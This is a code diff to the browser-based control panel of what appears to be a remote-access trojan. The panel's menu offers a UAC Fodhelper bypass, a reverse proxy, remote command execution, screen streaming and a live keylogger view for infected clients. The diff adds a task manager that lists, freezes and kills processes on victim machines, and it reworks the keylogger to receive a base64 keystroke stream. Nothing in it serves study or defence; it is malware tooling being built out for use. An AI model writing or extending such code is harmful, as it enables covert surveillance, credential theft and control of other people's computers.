@@ -820,7 +820,7 @@
             <div class="cm-group">
                 <div class="cm-title">System & Execution</div>
                 <div class="cm-item" onclick="cmd('info')"><i class="fa-solid fa-circle-info"></i> System Info</div>
-                <div class="cm-item" onclick="cmd('processes')"><i class="fa-solid fa-list"></i> Process List</div>
+                <div class="cm-item" onclick="cmd('process_manager')"><i class="fa-solid fa-list"></i> Task Manager</div>
                 <div class="cm-item" onclick="cmdShell()"><i class="fa-solid fa-terminal"></i> Run Command</div>
                 <div class="cm-item" onclick="cmd('uac_bypass')"><i class="fa-solid fa-shield-halved"></i> UAC Fodhelper</div>
                 <div class="cm-item" onclick="cmd('reverse_proxy')"><i class="fa-solid fa-server"></i> Reverse Proxy</div>
@@ -1197,8 +1197,8 @@
 
             socket.on('stream_frame', data => {
                 const img = document.getElementById('stream-img-target');
-                if(data.data && img) {
-                    img.src = 'data:image/jpeg;base64,' + data.data;
+                if(data.frame && img) {
+                    img.src = 'data:image/jpeg;base64,' + data.frame;
                     _streamFrameCount++;
                     
                     if(!_streamFpsTimer) {
@@ -1460,6 +1460,9 @@ if (typeof original_cmd === 'undefined') {
         if(action === 'screen_start') {
             if(typeof startStream === 'function') startStream();
         }
+        if(action === 'process_manager') {
+            if(typeof startProcessManager === 'function') startProcessManager();
+        }
         if(action === 'keylog_start') {
             if(typeof startKeylogger === 'function') startKeylogger();
         }
@@ -1628,47 +1631,106 @@ function startKeylogger() {
     const win = createDragWindow('keylog-win', 'Live Keylogger Intercept', 'fa-solid fa-keyboard', kbHtml);
     win.style.width = '700px';
 
-    // Start auto-dumping keylog from agent to light up the keyboard
     let lastKeylogLen = 0;
-    const poller = setInterval(() => {
-        if(!document.getElementById('keylog-win')) {
-            clearInterval(poller);
-            return;
-        }
-        execute(selectedClient, 'keylog_dump');
-    }, 2500);
 
-    // Override handleResult to catch keylog_dump specifically for the keyboard
+    // Override handleResult to catch keylog_stream specifically for the keyboard
     const prevHandler = window.handleResult || function(){};
     window.handleResult = function(cid, tag, fullData) {
         if(tag.toLowerCase().includes('keylog')) {
             const buf = document.getElementById('keylog-buffer');
             if(buf) {
-                buf.textContent = fullData;
+                // Determine if we're getting a chunk (base64) or a full dump (plain)
+                let chunk = fullData;
+                try {
+                    // keylog_stream data is base64 encoded
+                    if(tag === 'keylog_stream') chunk = atob(fullData);
+                } catch(e) {}
+                
+                buf.textContent += chunk;
                 // Animate keys that appear
-                const keys = fullData.match(/\[(.*?)\]/g) || [];
-                if(keys.length > lastKeylogLen) {
-                    const newKeys = keys.slice(lastKeylogLen);
-                    lastKeylogLen = keys.length;
-                    newKeys.forEach((k, i) => {
-                        setTimeout(() => {
-                            let kName = k.replace('[','').replace(']','');
-                            let btn = document.getElementById('vk-' + kName);
-                            if(!btn) {
-                                // Try mapping some generic ones
-                                if(kName.includes('Shift')) btn = document.getElementById('vk-LShiftKey');
-                                if(kName.includes('Control')) btn = document.getElementById('vk-LControlKey');
-                                if(kName.includes('Alt')) btn = document.getElementById('vk-LMenu');
-                            }
-                            if(btn) {
-                                btn.classList.add('active');
-                                setTimeout(() => btn.classList.remove('active'), 300);
-                            }
-                        }, i * 150); // cascading press effect
-                    });
-                }
+                const keys = chunk.match(/\[(.*?)\]/g) || [];
+                keys.forEach((k, i) => {
+                    setTimeout(() => {
+                        let kName = k.replace('[','').replace(']','');
+                        let btn = document.getElementById('vk-' + kName);
+                        if(!btn) {
+                            // Try mapping some generic ones
+                            if(kName.includes('Shift')) btn = document.getElementById('vk-LShiftKey');
+                            if(kName.includes('Control')) btn = document.getElementById('vk-LControlKey');
+                            if(kName.includes('Alt')) btn = document.getElementById('vk-LMenu');
+                        }
+                        if(btn) {
+                            btn.classList.add('active');
+                            setTimeout(() => btn.classList.remove('active'), 300);
+                        }
+                    }, i * 150); // cascading press effect
+                });
             }
             return; // consume
+        }
+        prevHandler(cid, tag, fullData);
+    };
+}
+
+function startProcessManager() {
+    if(!selectedClient) return;
+    execute(selectedClient, 'ps_list');
+    
+    const html = `
+        <div style="padding:10px; height: 100%; display:flex; flex-direction:column;">
+            <div style="display:flex; justify-content:space-between; margin-bottom: 10px;">
+                <button onclick="execute('${selectedClient}', 'ps_list')" style="background:var(--accent); color:#000; padding:6px 12px; border:none; border-radius:4px; cursor:pointer;"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
+            </div>
+            <div style="flex:1; overflow-y:auto; background:rgba(0,0,0,0.5); border-radius:8px; border:1px solid rgba(255,255,255,0.05);">
+                <table style="width:100%; border-collapse: collapse; text-align:left; font-size: 0.9rem;">
+                    <thead>
+                        <tr style="border-bottom:1px solid rgba(255,255,255,0.1);">
+                            <th style="padding:10px;">PID</th>
+                            <th style="padding:10px;">Name</th>
+                            <th style="padding:10px;">Mem (MB)</th>
+                            <th style="padding:10px; text-align:right;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="pm-tbody">
+                        <tr><td colspan="4" style="padding:10px;text-align:center;color:var(--text-muted)">Loading...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    `;
+    const win = createDragWindow('pm-win', 'Task Manager', 'fa-solid fa-list', html);
+    win.style.width = '600px';
+    win.style.height = '450px';
+    
+    // Setup specific handleResult hook for the process list
+    const prevHandler = window.handleResult || function(){};
+    window.handleResult = function(cid, tag, fullData) {
+        if(tag === 'ps_list' || tag === 'processes') {
+            const tbody = document.getElementById('pm-tbody');
+            if(tbody) {
+                try {
+                    const procs = JSON.parse(fullData);
+                    tbody.innerHTML = '';
+                    procs.forEach(p => {
+                        const tr = document.createElement('tr');
+                        tr.style.borderBottom = '1px solid rgba(255,255,255,0.05)';
+                        tr.innerHTML = `
+                            <td style="padding:8px 10px; color:var(--accent);">${p.pid}</td>
+                            <td style="padding:8px 10px;">${p.name}</td>
+                            <td style="padding:8px 10px; color:var(--text-muted);">${p.mem}</td>
+                            <td style="padding:8px 10px; text-align:right; white-space:nowrap;">
+                                <button onclick="execute('${cid}', 'ps_suspend ${p.pid}')" style="background:#555;color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;margin-right:4px;" title="Freeze"><i class="fa-solid fa-pause"></i></button>
+                                <button onclick="execute('${cid}', 'ps_resume ${p.pid}')" style="background:#555;color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;margin-right:4px;" title="Resume"><i class="fa-solid fa-play"></i></button>
+                                <button onclick="if(confirm('Kill PID ${p.pid}?')) execute('${cid}', 'ps_kill ${p.pid}')" style="background:var(--danger);color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;" title="Kill"><i class="fa-solid fa-skull"></i></button>
+                            </td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                } catch(e) {
+                    tbody.innerHTML = `<tr><td colspan="4" style="padding:10px;color:var(--danger)">Failed to parse processes: ${e.message}</td></tr>`;
+                }
+            }
+            return;
         }
         prevHandler(cid, tag, fullData);
     };
